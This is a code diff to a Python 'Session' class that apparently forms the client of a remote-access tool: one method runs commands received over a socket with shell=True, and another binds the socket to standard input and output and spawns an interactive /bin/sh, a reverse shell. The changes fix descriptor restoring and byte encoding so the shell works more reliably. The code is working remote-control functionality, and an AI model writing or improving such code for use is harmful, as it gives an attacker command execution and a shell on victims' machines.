@@ -60,7 +60,7 @@ class Session():
 
     def exec_cmd(self):
         print("comando: ", self.cmd)
-        subprocess.call(self.cmd, stdout=self.socket.fileno(),
+        subprocess.run(self.cmd, stdout=self.socket.fileno(),
                                 stderr=self.socket.fileno(), stdin=self.socket.fileno(),
                                 shell=True)
 
@@ -80,10 +80,21 @@ class Session():
 
     def reverse_shell(self):
         # subprocess.run(["/bin/sh"], stdin=self.socket.fileno(), stdout=self.socket.fileno(), stderr=self.socket.fileno())
+        prev_fd_in = os.dup(0)
+        prev_fd_out = os.dup(1)
+        prev_fd_err = os.dup(2)
         [os.dup2(self.socket.fileno(),fd) for fd in (0,1,2)]
         pty.spawn("/bin/sh")
+        os.dup2(prev_fd_in, 0)
+        os.dup2(prev_fd_out, 1)
+        os.dup2(prev_fd_err, 2)
+        os.close(prev_fd_in)
+        os.close(prev_fd_out)
+        os.close(prev_fd_err)
         print("finished")
-        self.socket.sendall("}shell finished EOF{")
+        EOF = "}shell finished EOF{"
+
+        self.socket.sendall(EOF.encode())
 
     def connect(self): 
         try:
